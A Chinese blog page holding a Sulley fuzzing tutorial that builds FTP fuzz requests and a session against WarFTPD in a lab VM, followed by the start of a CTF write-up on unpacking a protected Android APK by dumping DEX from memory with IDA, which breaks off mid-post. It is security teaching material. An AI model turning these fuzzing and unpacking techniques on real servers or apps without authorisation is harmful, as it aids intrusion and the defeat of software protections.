<h2 id="Sulley-primitives"><a href="#Sulley-primitives" class="headerlink" title="Sulley primitives"></a>Sulley primitives</h2><p>在我们开始开始对目标动手前，必须先定义好所有的building blocks（构建块），这些块负责产生协议相关的测试数据。Sulley提供了所需的各种的数据格式，为我们创建简单高效的protocol descriptions提供了便利。这些单独的数据组件叫做<code>primitives</code>（原语）。我们先简短讲解一些fuzz WarFTPD时候会用到的primitives。一旦你理解了如何使用其中一个primitives，那剩下的就很容易了。</p>
<h3 id="Strings"><a href="#Strings" class="headerlink" title="Strings"></a>Strings</h3><p>字符串（Strings）是使用最多的primitives。到处都有字符串；用户名，ip地址，目录等等。<code>s_string()</code>指令表示添加进测试数据的primitives是一个可fuzz的字符串。s_string()只有一个参数，就是有效的字符串，用于协议交互中的正常输入。<br>比如，你fuzzing一个email地址：<br>s_string(“<a href="mailto:&#x6a;&#117;&#x73;&#116;&#105;&#x6e;&#64;&#105;&#x6d;&#x6d;&#117;&#110;&#105;&#x74;&#x79;&#x69;&#110;&#x63;&#46;&#99;&#111;&#109;">&#x6a;&#117;&#x73;&#116;&#105;&#x6e;&#64;&#105;&#x6d;&#x6d;&#117;&#110;&#105;&#x74;&#x79;&#x69;&#110;&#x63;&#46;&#99;&#111;&#109;</a>“)，Sulley会把<a href="mailto:&#x6a;&#117;&#115;&#x74;&#105;&#110;&#x40;&#105;&#109;&#109;&#x75;&#x6e;&#105;&#x74;&#x79;&#105;&#110;&#99;&#x2e;&#99;&#x6f;&#109;">&#x6a;&#117;&#115;&#x74;&#105;&#110;&#x40;&#105;&#109;&#109;&#x75;&#x6e;&#105;&#x74;&#x79;&#105;&#110;&#99;&#x2e;&#99;&#x6f;&#109;</a>当作一个有效值，然后进行各种变形，最后扔给目标程序。让我们看看email地址变成了什么样。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">justin@immunityinc.comAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">justin@%n%n%n%n%n%n.com</span><br><span class="line">%d%d%d@immunityinc.comAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure>

<h3 id="Delimiters"><a href="#Delimiters" class="headerlink" title="Delimiters"></a>Delimiters</h3><p>Delimiters（定界符），用于将大的字符串分割成小的容易管理的片段。还是用先前的email地址做例子，用 <code>s_delim()</code>指令能够将它分割成更多的fuzz字符串。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s_string(&quot;justin&quot;)</span><br><span class="line">s_delim(&quot;@&quot;)</span><br><span class="line">s_string(&quot;immunityinc&quot;)</span><br><span class="line">s_delim(&quot;.&quot;,fuzzable&#x3D;False)</span><br><span class="line">s_string(&quot;com&quot;)</span><br></pre></td></tr></table></figure>
<p>通过s_delim()，我们将email地址分成了几个子串，并且告诉Sulley，我们在fuzzing的时候不使用点(.)，但是会使用@ 。</p>
<h3 id="Static-and-Random-Primitives"><a href="#Static-and-Random-Primitives" class="headerlink" title="Static and Random Primitives"></a>Static and Random Primitives</h3><p><code>s_static()</code>和<code>s_random()</code>，顾名思义，第一个使传入的数据不改变，第二个使数据随机的改变。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s_static(&quot;Hello,world!&quot;)</span><br><span class="line">s_static(&quot;\x41\x41\x41&quot;)</span><br></pre></td></tr></table></figure>
<p>s_random()可以随机产生变长的数据。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s_random(&quot;Justin&quot;,min_length&#x3D;6, max_length&#x3D;256, num_mutations&#x3D;10)</span><br></pre></td></tr></table></figure>
<p>min_length和max_length告诉Sully变形后的数据的长度范围，num_mutations为可选参数，表示变形的次数，默认为25次。<br>在我们的例子，使用”Justin”作为源数据，经过10次变形，产生6-256个长度的字符。</p>
<h3 id="Binary-Data"><a href="#Binary-Data" class="headerlink" title="Binary Data"></a>Binary Data</h3><p>Binary Data（二进制数据）是数据表示中的瑞士军刀。Sulley几乎能处理所有二进制数据。当我们在处理一些未知协议的数据包的时候，也许只是想看看服务器是如何回应我们生成的这些没有意义的数据的，这时候<code>s_binary()</code>就非常有用了。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s_binary(&quot;0x00 \\x41\\x42\\x43 0d 0a 0d 0a&quot;)</span><br></pre></td></tr></table></figure>
<p>Sully能识别出所有这类的数据，然后像将它们当作字符串使用。</p>
<h3 id="Integers"><a href="#Integers" class="headerlink" title="Integers"></a>Integers</h3><p>Integers(整数)的应用无处不在，从能看得见的明文数据，到看不见的二进制协议，以及数据长度，各种结构，等等。<br>下面列出了Sulley支持的主要几种整数类型。<br>1 byte   – s_byte(), s_char()<br>2 bytes – s_word(), s_short()<br>4 bytes – s_dword(), s_long(), s_int()<br>8 bytes – s_qword(), s_double()  </p>
<h3 id="Blocks-and-Groups"><a href="#Blocks-and-Groups" class="headerlink" title="Blocks and Groups"></a>Blocks and Groups</h3><p>Blocks(块)Groups(组)是Sulley提供的强大的组织工具。Blocks将独立的primitives组装成一个的有序的块。Groups 中包含了一些特定的primitives，一个Group和一个Block结合后，每次fuzzer调用Block的时候，都会将Group中的数据循环的取出，组成不同的Block。<br>下面就是一个使用块和组 fuzzing HTTP的例子。  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># import all of Sulley&#x27;s functionality.</span></span><br><span class="line"><span class="keyword">from</span> sulley <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># this request is for fuzzing: &#123;GET,HEAD,POST,TRACE&#125; /index.html HTTP/1.1</span></span><br><span class="line"><span class="comment"># define a new block named &quot;HTTP BASIC&quot;.</span></span><br><span class="line">s_initialize(<span class="string">&quot;HTTP BASIC&quot;</span>)</span><br><span class="line"><span class="comment"># define a group primitive listing the various HTTP verbs we wish to fuzz.</span></span><br><span class="line">s_group(<span class="string">&quot;verbs&quot;</span>, values=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;HEAD&quot;</span>, <span class="string">&quot;POST&quot;</span>, <span class="string">&quot;TRACE&quot;</span>])</span><br><span class="line"><span class="comment"># define a new block named &quot;body&quot; and associate with the above group.</span></span><br><span class="line"><span class="keyword">if</span> s_block_start(<span class="string">&quot;body&quot;</span>, group=<span class="string">&quot;verbs&quot;</span>):</span><br><span class="line"><span class="comment"># break the remainder of the HTTP request into individual primitives.</span></span><br><span class="line">    s_delim(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    s_delim(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">    s_string(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line">    s_delim(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    s_string(<span class="string">&quot;HTTP&quot;</span>)</span><br><span class="line">    s_delim(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">    s_string(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    s_delim(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">    s_string(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    <span class="comment"># end the request with the mandatory static sequence.</span></span><br><span class="line">    s_static(<span class="string">&quot;\r\n\r\n&quot;</span>)</span><br><span class="line"><span class="comment"># close the open block, the name argument is optional here.</span></span><br><span class="line">s_block_end(<span class="string">&quot;body&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>程序一开始我们就定义了一个叫verbs的组，其中包含了所有HTTP请求类型。之后定义了一个叫body的块，并且和verbs组绑定。这意味着，以后Sulley每次调用body内的变形数据的时候，都会循环的获取(GET, HEAD, POST, TRACE)4种请求方式，这样一来，一次body内的变形就相当于产生4个不同的body。<br>到目前为止，我们已经讲解完了Sulley的基础知识。当然Sulley不仅仅如此，还有数据解码，校验和计算，长度自动处理等等。想深入学习的同学可以看Pedram写的Fuzzing: Brute Force Vulnerability Discovery (Addison-Wesley, 2007)，一本综合了Sulley和fuzzing相关技术的好书。现在该开始对WarFTPD下手了。我们要先创建自己的primitive集合，然后将它们传给负责构建测试的框架内。</p>
<h2 id="Fuzzing-WarFTPD"><a href="#Fuzzing-WarFTPD" class="headerlink" title="Fuzzing WarFTPD"></a>Fuzzing WarFTPD</h2><p>FTP认证命令的格式如下:<br>USER &lt;USERNAME&gt;<br>PASS &lt;PASSWORD&gt;<br>一旦客户端传入了有效的用户名和密码后，服务器就会赋予客户端，传输文件，改变目录，查询文件等各种权限。当然USER和PASS命令只是FTP服务器提供的功能中的一个子集，在认证成功后还有很多别的功能，如下面列出的。这些新的命令都要加入到我们程序的协议框架(protocol skeleton)中。FTP协议详细的命令，请看rfc959。<br>CWD  &lt;DIRECTORY&gt;   - change working directory to DIRECTORY<br>DELE &lt;FILENAME&gt;    - delete a remote file FILENAME<br>MDTM &lt;FILENAME&gt;    - return last modified time for file FILENAME<br>MKD  &lt;DIRECTORY&gt;   - create directory DIRECTORY  </p>
<h3 id="创建ftp协议框架"><a href="#创建ftp协议框架" class="headerlink" title="创建ftp协议框架"></a>创建ftp协议框架</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ftp.py</span></span><br><span class="line"><span class="keyword">from</span> sulley <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s_initialize(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">s_static(<span class="string">&quot;USER&quot;</span>)</span><br><span class="line">s_delim(<span class="string">&quot; &quot;</span>)</span><br><span class="line">s_string(<span class="string">&quot;bruce&quot;</span>)</span><br><span class="line">s_static(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">s_initialize(<span class="string">&quot;pass&quot;</span>)</span><br><span class="line">s_static(<span class="string">&quot;PASS&quot;</span>)</span><br><span class="line">s_delim(<span class="string">&quot; &quot;</span>)</span><br><span class="line">s_string(<span class="string">&quot;bruce&quot;</span>)</span><br><span class="line">s_static(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">s_initialize(<span class="string">&quot;cwd&quot;</span>)</span><br><span class="line">s_static(<span class="string">&quot;CWD&quot;</span>)</span><br><span class="line">s_delim(<span class="string">&quot; &quot;</span>)</span><br><span class="line">s_string(<span class="string">&quot;c: &quot;</span>)</span><br><span class="line">s_static(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">s_initialize(<span class="string">&quot;dele&quot;</span>)</span><br><span class="line">s_static(<span class="string">&quot;DELE&quot;</span>)</span><br><span class="line">s_delim(<span class="string">&quot; &quot;</span>)</span><br><span class="line">s_string(<span class="string">&quot;c:\\test.txt&quot;</span>)</span><br><span class="line">s_static(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">s_initialize(<span class="string">&quot;mdtm&quot;</span>)</span><br><span class="line">s_static(<span class="string">&quot;MDTM&quot;</span>)</span><br><span class="line">s_delim(<span class="string">&quot; &quot;</span>)</span><br><span class="line">s_string(<span class="string">&quot;C:\\boot.ini&quot;</span>)</span><br><span class="line">s_static(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">s_initialize(<span class="string">&quot;mkd&quot;</span>)</span><br><span class="line">s_static(<span class="string">&quot;MKD&quot;</span>)</span><br><span class="line">s_delim(<span class="string">&quot; &quot;</span>)</span><br><span class="line">s_string(<span class="string">&quot;C:\\TESTDIR&quot;</span>)</span><br><span class="line">s_static(<span class="string">&quot;\r\n&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>protocol skeleton完成之后，让我们开始创建Sulley会话，把所有的请求信息连起来，同时启动网络嗅探和客户端调试。</p>
<h3 id="Sulley会话"><a href="#Sulley会话" class="headerlink" title="Sulley会话"></a>Sulley会话</h3><p>Sulley会话包含了请求数据整合，网络数据包的捕捉，进程调试，崩溃报告，和虚拟机控制。先让我们定义一个会话文件，然后详细的分析每个部分。  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ftp_session.py</span></span><br><span class="line"><span class="keyword">from</span> sulley <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> ftp <span class="comment"># this is our ftp.py file</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">receive_ftp_banner</span>(<span class="params">sock</span>):</span></span><br><span class="line">    sock.recv(<span class="number">1024</span>)</span><br><span class="line">sess = sessions.session(session_filename=<span class="string">&quot;audits/warftpd.session&quot;</span>)</span><br><span class="line">target = sessions.target(<span class="string">&quot;192.168.231.130&quot;</span>, <span class="number">21</span>)</span><br><span class="line">target.netmon  = pedrpc.client(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">26001</span>)</span><br><span class="line">target.procmon = pedrpc.client(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">26002</span>)</span><br><span class="line">target.procmon_options = &#123; <span class="string">&quot;proc_name&quot;</span> : <span class="string">&quot;war-ftpd.exe&quot;</span> &#125;</span><br><span class="line"><span class="comment"># Here we tie in the receive_ftp_banner function which receives</span></span><br><span class="line"><span class="comment"># a socket.socket() object from Sulley as its only parameter</span></span><br><span class="line">sess.pre_send = receive_ftp_banner</span><br><span class="line">sess.add_target(target)</span><br><span class="line">sess.connect(s_get(<span class="string">&quot;user&quot;</span>))</span><br><span class="line">sess.connect(s_get(<span class="string">&quot;user&quot;</span>), s_get(<span class="string">&quot;pass&quot;</span>))</span><br><span class="line">sess.connect(s_get(<span class="string">&quot;pass&quot;</span>), s_get(<span class="string">&quot;cwd&quot;</span>)) </span><br><span class="line">sess.connect(s_get(<span class="string">&quot;pass&quot;</span>), s_get(<span class="string">&quot;dele&quot;</span>))</span><br><span class="line">sess.connect(s_get(<span class="string">&quot;pass&quot;</span>), s_get(<span class="string">&quot;mdtm&quot;</span>))</span><br><span class="line">sess.connect(s_get(<span class="string">&quot;pass&quot;</span>), s_get(<span class="string">&quot;mkd&quot;</span>))</span><br><span class="line">sess.fuzz()</span><br></pre></td></tr></table></figure>
<p>receive_ftp_banner()是必须的，因为每个FTP服务器在客户端连接上的时候，都会发送banner(标识)。我们将它和sess.pre_send绑定起来，这样Sulley发送fuzzing数据前的时候就会先接收FTP banner。和receive_ftp_banner一样，pre_send也只接收一个由Sulley传递的sock对象。<br>第一步，我们创建一个会话文件，用于记录当前fuzzer的状态，同时控制fuzzing的启动和停止。<br>第二步，定义攻击的目标，包括IP地址和端口号。这里设置成 192.168.231.130端口21（这是我们运行WarFTPD虚拟机的IP）。<br>第三步，设置网络嗅探的端口为26001，IP地址和FTP服务器的地址一样，这个端口用于接受Sulley发出的命令。<br>第四步，设置调试器监听的端口26002，这个端口用于接收Sulley发出的调试命令。<br>第五步，procmon_options选项告诉调试器我们关注的进程是war-ftpd.exe。<br>第六步，在会话中加入定义好的目标对象。<br>第七步，将FTP请求指令有序的组织好。先是认证，然后将操作指令和需要的密码成对传入。<br>最后，启动Sulley开始fuzzing。</p>
<h3 id="网络和进程监控"><a href="#网络和进程监控" class="headerlink" title="网络和进程监控"></a>网络和进程监控</h3><p>Sulley的优点之一就是能非常好的跟踪fuzz期间的数据交互，以及目标系统的崩溃信息。这样我们就能在第一时间内分析出引起目标崩溃的数据包，然后快速的开发出exploit。<br>在Sulley的主目录下可以找到process_monitor.py和network_monitor.py两个脚本，他们分别负责网络监控和进程监控。<br>如下启动进程监控。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python process_monitor.py -c audits\warftpd.crash -p war-ftpd.exe</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ python network_monitor.py</span><br><span class="line">Output:</span><br><span class="line">ERR&gt; USAGE: network_monitor.py</span><br><span class="line">    &lt;-d|--device DEVICE #&gt;    device to sniff on (see list below)</span><br><span class="line">    [-f|--filter PCAP FILTER] BPF filter string</span><br><span class="line">    [-P|--log_path PATH]      log directory to store pcaps to</span><br><span class="line">    [-l|--log_level LEVEL]    log level (default 1), increase for more verbosity</span><br><span class="line">    [--port PORT]             TCP port to bind this agent to</span><br><span class="line">Network Device List:</span><br><span class="line">    [0] \Device\NPF_GenericDialupAdapter</span><br><span class="line">  [1] &#123;83071A13-14A7-468C-B27E-24D47CB8E9A4&#125;  192.168.231.130</span><br></pre></td></tr></table></figure>
<p>在这里我们需要使用[1]网络接口。如下启动网络监控。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python network_monitor.py -d 1 -f &quot;src or dst port 21&quot; -P pcaps</span><br></pre></td></tr></table></figure>
<p>提示：在启动之前必须先建立pcaps目录。</p>
<h3 id="Fuzzing和Web界面"><a href="#Fuzzing和Web界面" class="headerlink" title="Fuzzing和Web界面"></a>Fuzzing和Web界面</h3><p>现在我们启动Sulley，并使用内置的Web界面观察整个fuzz过程。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python ftp_session.py</span><br></pre></td></tr></table></figure>
<p>用浏览器打开<a href="http://127.0.0.1:26000，将看到fuzzing的过程。">http://127.0.0.1:26000，将看到fuzzing的过程。</a><br>类似的模糊测试器还有SPIKE、Peach等，也是非常有名，以后有机会希望能学习一下。<br><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://biancheng.dnbcw.net/win2003/341413.html">http://biancheng.dnbcw.net/win2003/341413.html</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2017/04/04/Android%E9%80%86%E5%90%91%E4%B9%8B%E8%84%B1%E5%A3%B3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/04/04/Android%E9%80%86%E5%90%91%E4%B9%8B%E8%84%B1%E5%A3%B3/" class="post-title-link" itemprop="url">Android逆向之脱壳</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2017-04-04 22:20:34" itemprop="dateCreated datePublished" datetime="2017-04-04T22:20:34+08:00">2017-04-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>本文主要介绍一下APK简单加固的破解方法，以及一些其他的逆向技巧和知识。现在市场中加固APK的方式一般有两种：一种是对源APK整体做一个加固，放到指定位置，运行的时候再解密动态加载；另一种是对so进行加固，在so加载内存的时候进行解密释放。本文主要针对第一种方式。</p>
<h3 id="题目介绍"><a href="#题目介绍" class="headerlink" title="题目介绍"></a>题目介绍</h3><p>用一个案例来讲解，阿里CTF2014的第三题：<br><img src="/images/androidre/main.png"><br><strong>题目要求：</strong>要求自己构造一个网页，并把网页对应的URL输入到URL输入框控件，然后，点击”进入”按钮，jscrack会打开webview浏览你的网页，如果jscrack能弹出一个Toast，就证明已经成功破解，同时Toast显示的内容就是这个题目的flag。<br><strong>题目的大致思路：</strong>输入的url会传递给一个WebView控件，进行网页展示，应该是网页中的JS会调用本地的一个Java方法，然后弹出相应的提示。</p>
<h3 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h3><p>按照破解的一般步骤：<br>（1）用JEB打开APK文件，对Java代码进行分析：<br><img src="/images/androidre/stubapplication.png"><br>这里只有一个Application类，所以这个APK应该是被加固了。加固一个APK，外面一定得套一个壳，这个壳必须是自定义的Application类（初始化操作）。因为没有其他类了，无处下手，只能从其他地方再分析。<br>（2）对AndroidManifest.xml文件进行分析：<br><img src="/images/androidre/androidmani.png"><br>不管APK如何加固，即使代码中看不到四大组件的定义，但是肯定会在AndroidManifest.xml中声明，因为不声明运行会报错。<br>当发现APK中主要的类都没有了，肯定是APK被加固了，加固的源程序肯定是在本地，一般会有这么几个地方需要注意的：</p>
<ul>
<li>应用程序的assert目录，我们知道这个目录是不参与apk的资源编译过程的，所以很多加固的应用喜欢把加密之后的源apk放到这里</li>
<li>把源apk加密放到壳的dex文件的尾部，这个肯定不是我们这里的案例，但是也有这样的加固方式，这种加固方式会发现使用dex2jar工具解析dex是失败的，我们这时候就知道了，肯定对dex做了手脚</li>
<li>把源apk加密放到so文件中，这个就比较难了，一般都是把源apk进行拆分，存到so文件中，分析难度会加大的。</li>
</ul>
<p>在assert/目录中发现了<code>cls.jar</code>和<code>fak.jar</code>两个jar文件，JD-GUI打开失败，猜想这个jar是加密过的，很有可能是存放源APK的地方。<br>刚刚分析过DEX文件，第二种方式肯定不可能。<br>在lib/目录中发现了<code>libhack.so</code>、<code>libmobisec.so</code>和<code>libtranslate.so</code>三个so文件，Application中加载的只有libmobisec.so，其他两个so文件可能存放了拆分的apk文件。<br>通过上面的分析之后，我们大致知道了两个地方很有可能是源apk的藏身地方，一个是assert目录，一个是libs目录，那么分析完了之后，我们发现现在面临两个问题：<br>第一个问题：assert/目录中的jar文件被处理了，打不开，也不知道处理逻辑；<br>第二个问题：lib/目录中的三个so文件，唯一加载了libmobisec.so文件，因为没有上层代码，没法分析。  </p>
<p>@JavascriptInterface这个注解是在SDK17加上的，也就是Android4.2版本中，那么在之前的版本中没有这个注解，任何public的方法都可以在JS代码中访问，而Java对象继承关系会导致很多public的方法都可以在JS中访问，其中一个重要的方法就是getClass()。然后JS可以通过反射来访问其他一些内容。这个也算是WebView的一个漏洞了。所以通过引入@JavascriptInterface注解，则在JS中只能访问@JavascriptInterface注解的函数。这样就可以增强安全性。  </p>
<h3 id="dump内存中的DEX内容"><a href="#dump内存中的DEX内容" class="headerlink" title="dump内存中的DEX内容"></a>dump内存中的DEX内容</h3><p>不管源程序如何加固，放到哪里，最终都是需要被加载到内存中，只要从内存中把这部分数据dump出来就可以了。在libdvm.so中的函数：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dvmDexFileOpenPartial</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *addr, <span class="keyword">int</span> len, DvmDex **ppDvmDex)</span></span>;</span><br></pre></td></tr></table></figure>
<p>函数的前两个参数就给出了dex文件在内存中的起始地址和大小，在这个函数下断点用IDC脚本dump内存即可。<br>dump过程：<br>（1）在设备中运行android_server，主机上进行adb forward端口转发：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@hammerhead:&#x2F;data&#x2F;local&#x2F;tmp # .&#x2F;android_server</span><br><span class="line">IDA Android 32-bit remote debug server(ST) v1.19. Hex-Rays (c) 2004-2015</span><br><span class="line">Listening on port #23946...</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ adb forward tcp:23946 tcp:23946</span><br></pre></td></tr></table></figure>
<p>（2）打开Monitor  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ monitor</span><br></pre></td></tr></table></figure>
<p>（3）使用adb命令以Debug模式启动APK  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ adb shell am start -D -n com.ali.tg.testapp&#x2F;.MainActivity</span><br><span class="line">WARNING: linker: app_process has text relocations. This is wasting memory and is a security risk. Please fix.</span><br><span class="line">WARNING: linker: app_process has text relocations. This is wasting memory and is a security risk. Please fix.</span><br><span class="line">Starting: Intent &#123; cmp&#x3D;com.ali.tg.testapp&#x2F;.MainActivity &#125;</span><br></pre></td></tr></table></figure>
<p>（4）打开IDA：Debugger-&gt;Attach-&gt;Remote ARMLinux/Android debugger附加到进程<br><img src="/images/androidre/attach.png"><br>（5）使用jdb命令启动连接attach调试器  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ jdb -connect com.sun.jdi.SocketAttach:hostname&#x3D;127.0.0.1,port&#x3D;8700</span><br></pre></td></tr></table></figure>
<p>（6）在IDA的Modules窗口中找到libdvm.so模块，双击打开，在模块中找到dvmDexFileOpenPartial函数并右键下断点：<br><img src="/images/androidre/openpartial.png"><br>（7）点击运行，Cancel掉弹出的窗口，程序就会运行到dvmDexFileOpenPartial()函数<br>（8）R0~R4寄存器一般是用来存放一个函数的参数值的，dvmDexFileOpenPartial()的第一个参数是dex内存起始地址，第二个参数是dex大小：<br><img src="/images/androidre/register.png"><br>下面就使用IDC脚本进行内存dump：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> fp, dex_addr, end_addr;</span><br><span class="line">    fp = fopen(<span class="string">&quot;/User/fan/dump.dex&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    end_addr = r0 + r1;</span><br><span class="line">    <span class="keyword">for</span> (dex_addr = r0; dex_addr &lt; end_addr; dex_addr++)</span><br><span class="line">        fputc(Byte(dex_addr), fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是dump内存中DEX的通用代码，在IDA的File-&gt;Script command…界面中运行这段代码，等一段时间就可以得到dump.dex文件了。</p>
<h3 id="分析正确的DEX文件"><a href="#分析正确的DEX文件" class="headerlink" title="分析正确的DEX文件"></a>分析正确的DEX文件</h3><p>用JEB打开dump出来的DEX文件，首先分析MainActivity，找到button的点击事件：<br><img src="/images/androidre/onclick.png"><br>这里把输入的url内容传递给WebViewActivity，但是这里的intent中的key是通过native方法decrypt_native加密了的，内容是dV.<br>接着分析WebViewActivity类：<br><img src="/images/androidre/jsinterface.png"><br>其中有一个JavaScriptInterface类，下面会通过addJavascriptInterface方法，添加Javascript接口：<br><img src="/images/androidre/addjsinterface.png"></p>
<blockquote>
